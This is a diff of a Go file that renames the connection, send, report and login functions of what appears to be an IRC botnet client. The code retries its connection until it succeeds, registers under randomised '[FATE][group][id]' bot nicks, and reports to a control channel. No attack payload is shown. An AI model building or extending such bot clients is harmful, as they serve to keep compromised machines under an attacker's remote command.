@@ -8,7 +8,7 @@ import (
 	"time"
 )
 
-func IRCconn(server string) net.Conn {
+func Conn(server string) net.Conn {
 	conn, err := net.Dial("tcp", server)
 	for err != nil {
 		time.Sleep(10 * time.Second)
@@ -17,11 +17,7 @@ func IRCconn(server string) net.Conn {
 	return conn
 }
 
-func IRCfind(read, msg string) bool {
-	return strings.Contains(read, msg)
-}
-
-func IRCrecv(comd string, arg int) string {
+func Recv(comd string, arg int) string {
 	for {
 		recv := strings.Split(comd, " ")
 		if len(recv) == arg {
@@ -31,23 +27,30 @@ func IRCrecv(comd string, arg int) string {
 	}
 }
 
-func (irc *IRC) IRCsend(data string) {
-	fmt.Fprintf(irc.Report, "%s\r\n", data)
+func Find(read, msg string) bool {
+	return strings.Contains(read, msg)
 }
 
-func (irc *IRC) IRCreport(msg string) {
-	irc.IRCsend("PRIVMSG " + irc.Channel + " " + " :" + msg)
+func name(alphabet rune) string {
+	return string(alphabet + rune(rand.Intn(26)))
 }
 
-func (irc *IRC) IRClogin() {
+func (bot *BOT) Send(data string) {
+	fmt.Fprintf(bot.IRC, "%s\r\n", data)
+}
+
+func (bot *BOT) Report(msg string) {
+	bot.Send("PRIVMSG " + bot.Channel + " " + " :" + msg)
+}
+
+func (bot *BOT) Login() {
 	rand.Seed(time.Now().UnixNano())
-	alphabet := 'A' + rune(rand.Intn(26))
-	sAlphabet := string(alphabet)
-	botID := rand.Intn(100000000)
+	id := rand.Intn(10000000)
+	group := name('A')
 
-	user := fmt.Sprint("USER [FATE][", sAlphabet, "][", botID, "]", " 8 * :bot")
-	nick := fmt.Sprint("NICK [FATE][", sAlphabet, "][", botID, "]")
+	user := fmt.Sprint("USER [FATE][", group, "][", id, "]", " 8 * :bot")
+	nick := fmt.Sprint("NICK [FATE][", group, "][", id, "]")
 
-	irc.IRCsend(user)
-	irc.IRCsend(nick)
+	bot.Send(user)
+	bot.Send(nick)
 }
